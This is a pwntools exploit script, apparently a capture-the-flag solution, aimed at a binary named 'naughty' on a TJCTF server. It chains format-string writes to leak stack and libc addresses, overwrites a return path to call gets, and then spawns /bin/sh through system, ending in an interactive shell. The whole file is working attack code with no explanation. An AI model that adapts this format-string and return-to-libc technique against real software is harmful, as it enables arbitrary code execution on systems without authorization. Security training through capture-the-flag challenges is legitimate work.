from pwn import *

e = ELF("./naughty")
libc = ELF("./libc.so")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8004)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})


target = 0x8049bc4

p.sendlineafter("?", (
  "%" + str(e.symbols["main"] % 0x10000) + "x" + "%15$hn" + ";%20$x;%16$s"
).ljust(0x20, "\x00") + p32(target) + p32(e.got["puts"])
)

p.recvuntil(";")
stk = int(p.recvuntil(";", drop=True), 16)  - 0xffeddc74 +  0xffeddc5c
leak = u32(p.recv(4)) - libc.symbols["puts"]

print(hex(leak))
print(hex(stk))

gets = leak + libc.symbols["gets"] - 16

writes = [
  [gets % 0x10000, 0],
  [gets // 0x10000, 1],
  [stk % 0x10000, 4],
  [stk // 0x10000, 5]
]

writes.sort(key=lambda k: k[0])

print(writes)

debug()

A = ""
B = ""

for i in range(len(writes)):
  prev = writes[i-1][0]
  if i == 0:
    prev = 0

  A += "%" + str(writes[i][0] - prev) + "x%" + str(39 + i) + "$hn"
  B += p32(stk + 2 * writes[i][1])
p.sendlineafter("?", A.ljust(0x80, "\x00") + B)

p.sendline("A" * 4 + p32(leak + libc.symbols["system"]) + p32(0) + p32(leak + next(libc.search("/bin/sh"))))

p.interactive()
